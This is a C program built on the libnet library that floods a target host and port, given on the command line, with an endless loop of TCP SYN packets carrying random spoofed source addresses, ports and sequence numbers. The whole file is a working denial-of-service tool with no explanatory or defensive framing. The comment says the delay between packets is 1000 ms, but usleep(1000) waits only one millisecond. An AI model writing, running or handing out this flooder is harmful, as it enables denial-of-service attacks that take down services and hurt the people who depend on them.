#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#define FLOOD_DELAY 1000 //wait 1000 ms

/*return ip x */
char *print_ip(__u_long *ip_addr_ptr) {
   return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );
}


int main(int argc, char *argv[]){
    int c;
    libnet_t *l;
    __u_long dest_ip;
    __u_short dest_port;
    __u_long src_ip;
    __u_short src_prt;
    char errbuf[LIBNET_ERRBUF_SIZE];
    int build_ip, opt, network, byte_count;
    libnet_ptag_t tcp_tag;

    if(argc < 3){
        printf("Usage:\n%s\t <target host> <target port> \n", argv[0]);
        exit(1);
    }


    l = libnet_init(
            LIBNET_RAW4_ADV,                         /* injection type */
            argv[1],                                 /* network interface */
            errbuf);  

    if (l == NULL){
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
    
    dest_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE);    
    dest_port = (__u_short) atoi(argv[2]);                      
    

    libnet_seed_prand(l);                           /*pseudo random numbers*/

    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
    int i;
    //for (tcp_tag = LIBNET_PTAG_INITIALIZER, i = 0; i < 10000; i++){

    tcp_tag = LIBNET_PTAG_INITIALIZER;
    while(1){  
    tcp_tag = libnet_build_tcp(
        src_prt = libnet_get_prand(LIBNET_PRu16),   /* source TCP port */
        dest_port,                                  /* destination TCP port */
        libnet_get_prand(LIBNET_PRu32),             /* sequence number */
        libnet_get_prand(LIBNET_PRu32),             /* acknowledgement number */
        TH_SYN,                                     /* control flags */
        libnet_get_prand(LIBNET_PRu16),             /* window size */
        0xd00d,                                     /* checksum  0xd00d*/
        0,                                          /* urgent pointer */
        LIBNET_TCP_H,                               /* TCP packet size */
        NULL,                                       /* payload (none) */
        0,                                          /* payload length */
        l,                                          /* libnet context */
        tcp_tag);                                   /* ptag */
        

        libnet_build_ipv4(
        LIBNET_TCP_H + LIBNET_IPV4_H,               /* total packet len */
        IPTOS_LOWDELAY,                             /* tos */
        libnet_get_prand(LIBNET_PRu16),             /* IP ID */
        0,                                          /* IP Frag */
        libnet_get_prand(LIBNET_PR8),               /* TTL */
        IPPROTO_TCP,                                /* protocol */
        0,                                          /* checksum */
        src_ip = libnet_get_prand(LIBNET_PRu32),             /* source ip */
        dest_ip,                                    /* dest ip */
        NULL,                                       /* payload (none) */
        0,                                          /* payload size */
        l,                                          /* libnet context */
        0);                                         /* ptag */
    
        //printf("packet send successfully");
        libnet_toggle_checksum(l, tcp_tag, 1);

    /*check errors while attack*/
        c = libnet_write(l);
            if (c == -1){   
                fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
            }

    /*wait 1000 ms*/
    usleep(FLOOD_DELAY);

    /*clean memory*/
    libnet_clear_packet(l);
    }  
    return 0;
}